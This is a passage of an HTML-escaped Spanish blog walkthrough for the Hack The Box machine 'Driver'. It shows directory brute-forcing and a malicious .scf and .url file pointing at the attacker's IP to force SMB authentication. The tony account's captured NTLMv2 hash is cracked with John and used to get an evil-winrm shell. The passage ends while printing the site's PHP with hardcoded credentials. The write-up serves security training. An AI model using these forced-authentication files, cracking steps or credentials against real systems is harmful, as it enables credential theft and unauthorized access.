+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
+by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher 🤓                 ver: 2.3.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://driver.htb/
+ 🚀  Threads               │ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
+ 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405, 500&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+ 💥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        │ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
+ 🦡  User-Agent            │ feroxbuster/2.3.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🤯  Header                │ Authorization:  Basic &lt;span class=&#34;nv&#34;&gt;YWRtaW46YWRtaW4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+ 💲  Extensions            │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;php&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+ 🔃  Recursion Depth       │ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+───────────────────────────┴──────────────────────
+ 🏁  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        2l       10w      148c http://driver.htb/images
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      185l      379w     4279c http://driver.htb/index.php
+&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;        2l       10w      148c http://driver.htb/Images
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      185l      379w     4279c http://driver.htb/Index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;user---tony&#34;&gt;User - Tony&lt;/h1&gt;
+&lt;p&gt;El sitio web nos permite subir archivos, intentamos con diferentes formatos pero parece ser que ninguno es ejecutado o movido a algun otro directorio. Al investigar sobre ataques por archivos en SMB, encontramos &lt;a href=&#34;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&#34;&gt;SCF File Attacks&lt;/a&gt;. Dicho ataque utiliza una &lt;a href=&#34;https://www.pcmag.com/encyclopedia/term/unc&#34;&gt;direccion UNC&lt;/a&gt; o direccion de recurso definida en &lt;code&gt;IconFile&lt;/code&gt; dentro de un archivo &lt;code&gt;.scf&lt;/code&gt;, al colocar este archivo en un recurso y un usuario al acceder a este, el archivo es ejecutado y, el usuario intenta acceder al recurso definido (&lt;code&gt;IconFile&lt;/code&gt;) lo que hace que se autentique en el recurso y al tener responder en ejecución es posible capturar el hash de autenticación del usuario.&lt;/p&gt;
+&lt;p&gt;Replicamos este ataque, creando un archivo que contenga nuestra direccion IP.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ cat scx.scf
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Shell&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;IconFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.15&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ckull.ico
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Taskbar&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ToggleDesktop
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecutamos responder, subimos el archivo y tras unos segundos vemos que el usuario &lt;code&gt;tony&lt;/code&gt; accede al recurso, con ello obtuvimos el hash ntlm.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Client   : 10.10.11.106
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Username : DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; NTLMv2-SSP Hash     : tony::DRIVER:0b940ebf05184c8d:2CEA298880C79699FAED0D1BD590BA8E:010100000000000080A2972CCEB7D70160670D2514033A9300000000020008003600340030004D0001001E00570049004E002D005600440041005600410041004300580055003700530004003400570049004E002D00560044004100560041004100430058005500370053002E003600340030004D002E004C004F00430041004C00030014003600340030004D002E004C004F00430041004C00050014003600340030004D002E004C004F00430041004C000700080080A2972CCEB7D70106000400020000000800300030000000000000000000000000200000D7D5A09B6D6231233A414B29A11FD4730FD7091D7057F8686380C4839199EAF50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003000000000000000000000000000
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Skipping previously captured &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;crack-hash&#34;&gt;Crack Hash&lt;/h2&gt;
+&lt;p&gt;Utilizamos John con el wordlist rockyou.txt para crackear el hash de tony.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt; hash_tony
+Using default input encoding: UTF-8
+Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;netntlmv2, NTLMv2 C/R &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MD4 HMAC-MD5 32/64&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
+Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+liltony          &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;tony&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1g 0:00:00:00 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-10-02 20:44&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 9.090g/s 297890p/s 297890c/s 297890C/s !!!!!!..eatme1
+Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=netntlmv2&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
+Session completed
+ π ~/htb/driver ❯
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
+&lt;p&gt;nmap mostró que el puerto WinRM esta abierto, utilizamos las credenciales que obtuvimos para acceder por este puerto utilizando &lt;code&gt;evil-winrm&lt;/code&gt;, logrando obtener la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/driver ❯ evil-winrm -i driver.htb -u tony -p liltony
+
+Evil-WinRM shell v3.3
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami
+driver&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; ..&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt
+4d5bc94c1589f8e3d3bbc7ef748c97e6
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;url&#34;&gt;.URL&lt;/h2&gt;
+&lt;p&gt;De igual forma utilizando un archivo &lt;a href=&#34;https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-url&#34;&gt;.url&lt;/a&gt; funciona para obtener el hash de tony.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;InternetShortcut&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whatever
+&lt;span class=&#34;nv&#34;&gt;WorkingDirectory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whatever
+&lt;span class=&#34;nv&#34;&gt;IconFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.15&lt;span class=&#34;se&#34;&gt;\%&lt;/span&gt;USERNAME%.icon
+&lt;span class=&#34;nv&#34;&gt;IconIndex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web-site-1&#34;&gt;Web Site&lt;/h2&gt;
+&lt;p&gt;En el directorio &lt;code&gt;inetpub\&lt;/code&gt; encontramos el codigo fuente de la página, vemos que esta definido el tipo de &lt;a href=&#34;https://www.php.net/manual/es/features.http-auth.php&#34;&gt;autenticacion por http&lt;/a&gt; y se muestran las credenciales, además vemos que el directorio donde se almacenan los archivos es &lt;code&gt;C:\firmwares\&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; dir -Force
+
+
+    Directory: C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         9/7/2021  11:29 PM                images
+-a----         9/8/2021   5:06 AM           &lt;span class=&#34;m&#34;&gt;6136&lt;/span&gt; fw_up.php
+-a----         9/8/2021   4:51 AM           &lt;span class=&#34;m&#34;&gt;4906&lt;/span&gt; index.php
+
+
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; cat fw_up.php
+
+&amp;lt;?php
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; isset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; AND
+      &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; isset&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_PW&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_AUTH_PW&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;){&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\\firmwares\\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; . basename&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
